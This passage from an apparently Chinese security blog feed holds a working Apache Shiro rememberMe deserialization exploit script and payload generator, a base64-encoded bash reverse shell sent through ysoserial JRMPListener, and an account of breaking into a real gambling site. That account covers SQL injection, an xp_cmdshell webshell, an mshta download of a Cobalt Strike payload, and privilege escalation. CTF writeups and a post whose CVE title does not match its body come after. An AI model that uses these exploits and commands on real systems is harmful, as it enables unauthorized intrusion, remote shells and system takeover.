class="string">&#x27;://&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> url:</span><br><span class="line">        target = <span class="string">&#x27;https://%s&#x27;</span> % url <span class="keyword">if</span> <span class="string">&#x27;:443&#x27;</span> <span class="keyword">in</span> url <span class="keyword">else</span> <span class="string">&#x27;http://%s&#x27;</span> % url</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        target = url</span><br><span class="line"></span><br><span class="line">    print(<span class="string">&quot;checking url:&quot;</span> + url)</span><br><span class="line"></span><br><span class="line">    domain = getdnshost()</span><br><span class="line">    <span class="keyword">if</span> domain:</span><br><span class="line">        reversehost = <span class="string">&quot;http://&quot;</span> + domain</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> CipherKey <span class="keyword">in</span> CipherKeys:</span><br><span class="line">            ret = &#123;<span class="string">&quot;vul&quot;</span>:<span class="literal">False</span>,<span class="string">&quot;CipherKey&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;url&quot;</span>:target&#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                print(<span class="string">&quot;try CipherKey :&quot;</span> +CipherKey)</span><br><span class="line"></span><br><span class="line">                payload = genpayload((<span class="string">&quot;URLDNS&quot;</span>,reversehost),CipherKey,JAR_FILE)</span><br><span class="line"></span><br><span class="line">                print(<span class="string">&quot;generator payload done.&quot;</span>)</span><br><span class="line"></span><br><span class="line">                r = requests.get(target,cookies=&#123;<span class="string">&#x27;rememberMe&#x27;</span>: payload.decode()&#125;,timeout=<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">                print(<span class="string">&quot;send payload ok.&quot;</span>)</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">5</span>):</span><br><span class="line">                    print(<span class="string">&quot;checking.....&quot;</span>)</span><br><span class="line"></span><br><span class="line">                    time.sleep(<span class="number">2</span>)</span><br><span class="line">                    temp = getrecord()</span><br><span class="line">                    <span class="keyword">if</span> domain <span class="keyword">in</span> temp:</span><br><span class="line">                        ret[<span class="string">&quot;vul&quot;</span>] = <span class="literal">True</span></span><br><span class="line">                        ret[<span class="string">&quot;CipherKey&quot;</span>] = CipherKey</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                print(<span class="built_in">str</span>(e))</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">if</span> ret[<span class="string">&quot;vul&quot;</span>]:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;get dns host error&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>(<span class="params">url,gadget,params,CipherKey</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;://&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> url:</span><br><span class="line">        target = <span class="string">&#x27;https://%s&#x27;</span> % url <span class="keyword">if</span> <span class="string">&#x27;:443&#x27;</span> <span class="keyword">in</span> url <span class="keyword">else</span> <span class="string">&#x27;http://%s&#x27;</span> % url</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        target = url</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = genpayload((gadget, params),CipherKey,JAR_FILE)</span><br><span class="line">        r = requests.get(target,cookies=&#123;<span class="string">&#x27;rememberMe&#x27;</span>: payload.decode()&#125;,timeout=<span class="number">10</span>)</span><br><span class="line">        print(r.text)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">&quot;exploit error:&quot;</span> + <span class="built_in">str</span>(e))</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getdnshost</span>():</span></span><br><span class="line">    reversehost = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span> :</span><br><span class="line">        domain = getdomain()</span><br><span class="line">        <span class="keyword">if</span> domain==<span class="string">&quot;error&quot;</span>:</span><br><span class="line">            print(<span class="string">&quot;getdomain error&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment">#reversehost = &quot;http://&quot; +domain</span></span><br><span class="line">            reversehost = domain</span><br><span class="line">            <span class="comment">#print(&quot;got reversehost : &quot; + reversehost)</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> reversehost</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">detector</span>(<span class="params">url,CipherKey,command</span>):</span></span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;://&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> url:</span><br><span class="line">        target = <span class="string">&#x27;https://%s&#x27;</span> % url <span class="keyword">if</span> <span class="string">&#x27;:443&#x27;</span> <span class="keyword">in</span> url <span class="keyword">else</span> <span class="string">&#x27;http://%s&#x27;</span> % url</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        target = url</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> g <span class="keyword">in</span> gadgets:</span><br><span class="line">            g = g.strip()</span><br><span class="line"></span><br><span class="line">            domain = getdnshost()</span><br><span class="line">            <span class="keyword">if</span> domain:</span><br><span class="line">                <span class="keyword">if</span> g == <span class="string">&quot;JRMPClient&quot;</span>:</span><br><span class="line">                    param = <span class="string">&quot;%s:80&quot;</span> % domain</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    param = command.replace(<span class="string">&quot;&#123;dnshost&#125;&quot;</span>,domain)</span><br><span class="line">                payload = genpayload((g, param),CipherKey,JAR_FILE)</span><br><span class="line">                print(g + <span class="string">&quot; testing.....&quot;</span>)</span><br><span class="line">                r = requests.get(target,cookies=&#123;<span class="string">&#x27;rememberMe&#x27;</span>: payload.decode()&#125;,timeout=<span class="number">10</span>)</span><br><span class="line">                <span class="comment">#print(r.read())</span></span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">5</span>):</span><br><span class="line">                    <span class="comment">#print(&quot;checking.....&quot;)</span></span><br><span class="line">                    time.sleep(<span class="number">2</span>)</span><br><span class="line">                    temp = getrecord()</span><br><span class="line">                    <span class="keyword">if</span> domain <span class="keyword">in</span> temp:</span><br><span class="line">                        ret = g</span><br><span class="line">                        <span class="comment">#ret[&quot;CipherKey&quot;] = CipherKey</span></span><br><span class="line">                        result.append(ret)</span><br><span class="line">                        print(<span class="string">&quot;found gadget:\t&quot;</span> + g)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">&quot;get dns host error&quot;</span>)</span><br><span class="line">                    <span class="comment">#break</span></span><br><span class="line">        <span class="comment">#print(r.text)</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">&quot;detector error:&quot;</span> + <span class="built_in">str</span>(e))</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parser_error</span>(<span class="params">errmsg</span>):</span></span><br><span class="line">    print(<span class="string">&quot;Usage: python &quot;</span> + sys.argv[<span class="number">0</span>] + <span class="string">&quot; [Options] use -h for help&quot;</span>)</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_args</span>():</span></span><br><span class="line">    <span class="comment"># parse the arguments</span></span><br><span class="line">    parser = argparse.ArgumentParser(epilog=<span class="string">&quot;\tExample: \r\npython &quot;</span> + sys.argv[<span class="number">0</span>] + <span class="string">&quot; -u target&quot;</span>)</span><br><span class="line">    parser.error = parser_error</span><br><span class="line">    parser._optionals.title = <span class="string">&quot;OPTIONS&quot;</span></span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-u&#x27;</span>, <span class="string">&#x27;--url&#x27;</span>, <span class="built_in">help</span>=<span class="string">&quot;Target url.&quot;</span>, default=<span class="string">&quot;http://127.0.0.1:8080&quot;</span>,required=<span class="literal">True</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-t&#x27;</span>, <span class="string">&#x27;--type&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Check or Exploit. Check :1 , Exploit:2 , Find gadget:3&#x27;</span>, default=<span class="string">&quot;1&quot;</span>,required=<span class="literal">False</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-g&#x27;</span>, <span class="string">&#x27;--gadget&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;gadget&#x27;</span>, default=<span class="string">&quot;CommonsCollections2&quot;</span>,required=<span class="literal">False</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;--params&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;gadget params&#x27;</span>,default=<span class="string">&quot;whoami&quot;</span>,required=<span class="literal">False</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-k&#x27;</span>, <span class="string">&#x27;--key&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;CipherKey&#x27;</span>,default=<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>,required=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">return</span> parser.parse_args()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    args = parse_args()</span><br><span class="line">    url = args.url</span><br><span class="line">    <span class="built_in">type</span> = args.<span class="built_in">type</span></span><br><span class="line">    command = args.params</span><br><span class="line">    key = args.key</span><br><span class="line">    gadget = args.gadget</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>==<span class="string">&quot;1&quot;</span>:</span><br><span class="line">        r = check(url)</span><br><span class="line">        print(<span class="string">&quot;\nvulnerable:%s url:%s\tCipherKey:%s\n&quot;</span> %(<span class="built_in">str</span>(r[<span class="string">&quot;vul&quot;</span>]),url,r[<span class="string">&quot;CipherKey&quot;</span>]))</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">type</span>==<span class="string">&quot;2&quot;</span>:</span><br><span class="line">        exploit(url,gadget,command,key)</span><br><span class="line">        print(<span class="string">&quot;exploit done.&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">type</span>==<span class="string">&quot;3&quot;</span>:</span><br><span class="line">        </span><br><span class="line">        r = detector(url,key,command)</span><br><span class="line">        <span class="keyword">if</span> r :</span><br><span class="line">            print(<span class="string">&quot;found gadget:\n&quot;</span>)</span><br><span class="line">            print(r)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;invalid type&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1183626290.png"></p><p>根据脚本里面的key进行扫描,并返回key<br>利用漏洞获取shell<br>使用jackson编码 <a href="http://www.jackson-t.ca/runtime-exec-payloads.html">http://www.jackson-t.ca/runtime-exec-payloads.html</a></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/410677616.png"></p><p>nc监听反弹shell的端口<br>nc -lvp 1234<br>使用ysoserial.jar的JRMP监听(本机或者vps上监听)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 6666 CommonsCollections4 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4yMjguMTEuMTU5LzExMjMgMD4mMQ&#x3D;&#x3D;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br></pre></td></tr></table></figure><p>生成payload的exp：shiro_exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_rememberme</span>(<span class="params">command</span>):</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">&#x27;java&#x27;</span>, <span class="string">&#x27;-jar&#x27;</span>, <span class="string">&#x27;ysoserial.jar&#x27;</span>, <span class="string">&#x27;JRMPClient&#x27;</span>, command], stdout=subprocess.PIPE)</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    <span class="comment"># 密钥使用检测成功的密钥</span></span><br><span class="line">    key = base64.b64decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>)</span><br><span class="line">    iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">    encryptor = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    payload = encode_rememberme(sys.argv[<span class="number">1</span>])    </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;rememberMe=&#123;0&#125;&quot;</span>.<span class="built_in">format</span>(payload.decode())</span><br><span class="line">python2 shiro_exp.py <span class="number">10.228</span><span class="number">.11</span><span class="number">.159</span>:<span class="number">6666</span> 意思是把shell反弹到vsp(你的本机)上的<span class="number">6666</span>端口</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3077247030.png"></p><p>burp请求</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1255460863.png"></p><p>成功获取shell</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/920891601.png"></p>]]></content>
      
      
      <categories>
          
          <category> Gamma实验室 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shiro反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记录某博彩网站渗透</title>
      <link href="2020/12/05/%E8%AE%B0%E5%BD%95%E6%9F%90%E5%8D%9A%E5%BD%A9%E7%BD%91%E7%AB%99%E6%B8%97%E9%80%8F/"/>
      <url>2020/12/05/%E8%AE%B0%E5%BD%95%E6%9F%90%E5%8D%9A%E5%BD%A9%E7%BD%91%E7%AB%99%E6%B8%97%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<p>最初，我得到的只有一个后台网址，深深吸了口烟，可攻击点太少了。<br>如果没有弱口令，注入，和直接rce的点，是很难打开缺口的<br>所以首先第一步要做的事情进行信息搜集了！<br>渗透的本质是信息收集的<br>在网络空间安全搜索引擎fofa上查询一下，再就是端口扫描 ，直接略过，懂的都懂。<br>有利用价值的端口：80,81,1433,3389<br>脆弱点：<a href="http://49.xxx.xx.xxx/">http://49.xxx.xx.xxx</a>:81/Login/index<br>但是通过一段常规操作操作后，发现后台登录界面存在堆叠注入！<br>且获得如下信息：<br>SQL注入post包(在响应包中得到ASP.NET+Microsoft-IIS/7.5)<br>权限：SA</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/334607215.png"></p><p>刚开始得到注入就想着进入后台看看，但是没有回显，就肝了一段时间的py脚本。</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2145323975.png"></p><p>得到密码进入后台，模板千篇一律，无数据备份，无修改模板，上传个人判断基于白名单，有编辑器不过示例代码已删除，留言板不可留言，回过头来又看注入，既然是堆叠注入，那就可以执行SQL语句，然后一顿操作，嗯嗯嗯… 没有回显，代码如下：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1251178843.png"></p><p>以为到这里就结束了，没想到 3389端口登录失败，1433端口连接失败！这里我很懵，经过大佬的一番指导，可以把注入信息通过外带DNSLlog，或者直接使用xp_cmdshell执行命令，但是不知道是否开启，所有尝试了一下ping以下dnslog,还好前几天补过：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1861135234.png"></p><p>既然dnslog有回显，那就证明xp_cmdshel扩展开启，可以执行命令，这里两种思路:<br>第一种是cmd执行命令，输出到网站根目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;;exec master…xp_cmdshell ‘echo ^&lt;%@ Page Language&#x3D;“Jscript”%&gt;&lt;%eval(Request.Item[“pass”],“unsafe”);%^&gt; &gt; c:\网站路径\shell.aspx’;–</span><br></pre></td></tr></table></figure><p>由于我爆不出来绝对路径就采用了第二种方法<br>第二种是下载木马，运行木马直接上线<br>cs设置好监听器，生成一个html application文件，然后上传到cs服务器上<br>在注入点执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;; exec master.dbo.xp_cmdshell ‘mshta http:&#x2F;&#x2F;39.xx.xxx.xxx:80&#x2F;download&#x2F;file.ext’; –</span><br></pre></td></tr></table></figure><p>过一会儿有台主机上线了</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2532348242.png"></p><p>补丁安装200多，较多，把systeminfo中的信息漏洞对比，看有没有漏补的，发现可利用漏洞ms16-075<br>systeminfo | findstr KB3164038<br><a href="https://github.com/vysecurity/reflectivepotato.git">https://github.com/vysecurity/reflectivepotato.git</a> github上该exp的cna插件，加载到脚本管理器中</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/370159021.png"></p><p>我这里直接创建管理员，但是更隐蔽的方法是通过mimikatz读取hash或者SSP获取明文密码，来获取持久控制，或者利用计划任务，过一段时间反弹shell回来！</p><p>渗透本就是逆天而行！</p>]]></content>
      
      
      <categories>
          
          <category> Gamma实验室 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>白嫖真香系列-pwn个人专用虚拟机分享</title>
      <link href="2020/11/25/%E7%99%BD%E5%AB%96%E7%9C%9F%E9%A6%99%E7%B3%BB%E5%88%97-pwn%E4%B8%AA%E4%BA%BA%E4%B8%93%E7%94%A8%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%88%86%E4%BA%AB/"/>
      <url>2020/11/25/%E7%99%BD%E5%AB%96%E7%9C%9F%E9%A6%99%E7%B3%BB%E5%88%97-pwn%E4%B8%AA%E4%BA%BA%E4%B8%93%E7%94%A8%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%88%86%E4%BA%AB/</url>
      
        <content type="html"><![CDATA[<p><strong>还在为苦苦为搭pwn环境而发愁吗？还在为环境错误导致无法更好pwn而苦恼吗？那么现在你的福利来了，个人专用pwn虚拟机它来了，环境已经备好，你准备白嫖了吗？</strong></p><blockquote><p>虚拟机环境配置情况<br>1.ubuntu18.0.4<br>2.gdb+插件<br>3.wine+IDA7.0<br>4.pwntools+python2<br>5.nasm<br>6.Libc-database<br>7.LibcSearcher<br>8.一张精美的壁纸</p></blockquote><h1 id="虚拟机预览"><a href="#虚拟机预览" class="headerlink" title="虚拟机预览"></a>虚拟机预览</h1><p>主界面</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3074059537.png"></p><p>gdb界面</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3120056197.png"></p><p>IDA界面</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3735507374.png"></p><h1 id="分享虚拟机说明"><a href="#分享虚拟机说明" class="headerlink" title="分享虚拟机说明"></a>分享虚拟机说明</h1><p>此虚拟机没有任何作者个人的东西在里面，基础环境没有问题，后续需要什么工具自行添加，完全可根据自己需求进行定制化！</p><blockquote><p><strong>虚拟机登录密码：root</strong></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">下载地址：</span><br><span class="line">https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1MICtzBZ0fpYrsDmZAXHwgQ（提取码：irqk）</span><br><span class="line">压缩包密码获取方式：</span><br><span class="line">关注Gamma安全实验室，发送消息“pwn虚拟机”</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Gamma实验室 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具推送 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-大吉大利杯&amp;&amp;“春秋杯”新年欢乐赛 2021</title>
      <link href="2020/11/24/2020HECTF&amp;%E7%A5%A5%E4%BA%91%E6%9D%AF/"/>
      <url>2020/11/24/2020HECTF&amp;%E7%A5%A5%E4%BA%91%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="HECTF"><a href="#HECTF" class="headerlink" title="HECTF"></a>HECTF</h1><h2 id="【真签到题】快来看直播啦"><a href="#【真签到题】快来看直播啦" class="headerlink" title="【真签到题】快来看直播啦~"></a>【真签到题】快来看直播啦~</h2><blockquote><p>前往直播间，调戏小蓝蓝获取flag。<br>注：本题衰减极限将为100<br><a href="https://live.bilibili.com/6789627">https://live.bilibili.com/6789627</a></p></blockquote><p>B站直播屏幕即可看到flag</p><h2 id="【The-End】世界的终焉"><a href="#【The-End】世界的终焉" class="headerlink" title="【The End】世界的终焉"></a>【The End】世界的终焉</h2><blockquote><p>终于，你来到了本次HECTF的尽头<br>突然一个背着大板子的地精跳了出来！骚年！留个言吗！<br><a href="http://traceability.ctftraining.cn/jq/98289565.aspx">http://traceability.ctftraining.cn/jq/98289565.aspx</a></p></blockquote><p>填问卷得flag</p><h2 id="png"><a href="#png" class="headerlink" title="png"></a>png</h2><blockquote><p>好可爱的小猫咪鸭~</p><p><a href="https://pan.baidu.com/s/1sRaqAArQIVDOOM9SoFHuSg"><strong>附件</strong></a>（提取码：9qi0）</p></blockquote><p>本题flag分两部分：修改图片高度 + 010打开尾部base64</p><p>第一步：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4069440216.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1543670602.png"></p><p>第二步：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1893160869.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1748197943.png"></p><p>最后组合得到flag：flag{94ed7fdae8f504743b79bdf8fcfd55fd}</p><h2 id="不说人话"><a href="#不说人话" class="headerlink" title="不说人话"></a>不说人话</h2><blockquote><p>阴阳怪气？！</p><p><a href="https://pan.baidu.com/s/1TXzELxVViDEh9trTcGk3rQ"><strong>附件</strong></a>（提取码：gpo4）</p></blockquote><p>.、？、！很明显就是<a href="https://www.splitbrain.org/services/ook"><strong>brainfuck-Ook编码</strong></a><br>“**.<strong>”替换“</strong>Ook.<strong>”；“</strong>?<strong>”替换“</strong>Ook?<strong>”；“</strong>!<strong>”替换“</strong>Ook!**”<br>解码即可得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3387670304.png"></p><h2 id="溯源！溯源！溯源！"><a href="#溯源！溯源！溯源！" class="headerlink" title="溯源！溯源！溯源！"></a>溯源！溯源！溯源！</h2><blockquote><p>让我们一起来愉快的溯源吧~<br>本答卷中涉及的所有手机号均为随机生成的手机号码，所有参赛人员应当仅完成题目中要求即可，不允许进一步对手机号做进一步&gt; 社会工程攻击，由此造成的任何法律责任由参赛人员承担。<br>问卷密码即为参赛者的初始参赛密码。<br>每位参赛者有5次挑战机会，每次挑战需要在10分钟内挑战完毕。 每次挑战结束，成功的挑战者将获得flag，失败的挑战者会获得一次抽奖机会，有1%的概率直接抽中flag。<br>挑战链接：<a href="http://traceability.ctftraining.cn/jq/98028270.aspx">http://traceability.ctftraining.cn/jq/98028270.aspx</a></p></blockquote><p>通过天眼查、转账等手段找到所给信息对应的姓名，公司<br>最终得到flag</p><h2 id="babyMisc"><a href="#babyMisc" class="headerlink" title="babyMisc"></a>babyMisc</h2><blockquote><p>这是一个非常简单的misc<br>你能发现其中的秘密吗?<br>文件hex尾部有编码后的flag的后两位<br>flag格式:”HECTF{}”</p><p><a href="https://pan.baidu.com/s/1-WYInOhq-1-UseJK4hV-pQ"><strong>附件</strong></a>（提取码：g3jj）</p><p>hint:PE也想有session？这么小声也想有session？</p></blockquote><p>根据题目提示用010打开查看hex尾部发现可疑字符</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/340722991.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2723202087.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2635967460.png"></p><p>ylbnb ò ó 最后再加上zp，base58解码得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1316160874.png"></p><h1 id="祥云杯"><a href="#祥云杯" class="headerlink" title="祥云杯"></a>祥云杯</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><blockquote><p>ZmxhZ3txcV9ncm91cF84MjY1NjYwNDB9</p></blockquote><p>base64解码得到flag</p><p>没时间做了<del>也不太想复现</del>（我是懒狗.jpg</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HECTF </tag>
            
            <tag> 祥云杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2021-3156 sudo堆栈溢出漏洞预警</title>
      <link href="2020/11/23/CVE-2019-0708%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/"/>
      <url>2020/11/23/CVE-2019-0708%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="01-漏洞详情"><a href="#01-漏洞详情" class="headerlink" title="01 漏洞详情"></a>01 漏洞详情</h1><p>Windows系列服务器于2019年5月15号，被爆出高危漏洞，该漏洞影响范围较广，漏洞利用方式是通过远程桌面端口3389，RDP协议进行攻击的。这个漏洞是今年来说危害严重性最大的漏洞，跟之前的勒索，永恒之蓝病毒差不多。</p><blockquote><p>影响系统：windows2003、windows2008、windows2008 R2、windows xp 、win7</p></blockquote><h1 id="02-工具分享"><a href="#02-工具分享" class="headerlink" title="02 工具分享"></a>02 工具分享</h1><blockquote><p>链接：<a href="https://pan.baidu.com/s/1NeaYWuIFoRs0xCHW4S_ntw">https://pan.baidu.com/s/1NeaYWuIFoRs0xCHW4S_ntw</a><br>提取码：n3zm</p></blockquote><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>攻击机：kali IP: 10.1.8.167<br>靶机： win7 IP:10.1.8.8（开放3389端口）</p><p>Win7靶机开启和关闭3389端口</p><p>（1）开启3389端口：<br>在cmd内，执行如下命令，即可开启3389端口。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f</span><br></pre></td></tr></table></figure><p>（2）关闭3389端口：<br>在cmd内，执行如下命令，即可关闭3389端口。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 11111111 &#x2F;f</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3988915923.png"></p><h1 id="03-蓝屏"><a href="#03-蓝屏" class="headerlink" title="03 蓝屏"></a>03 蓝屏</h1><p>使用nmap对靶机进行扫描：</p><p><img 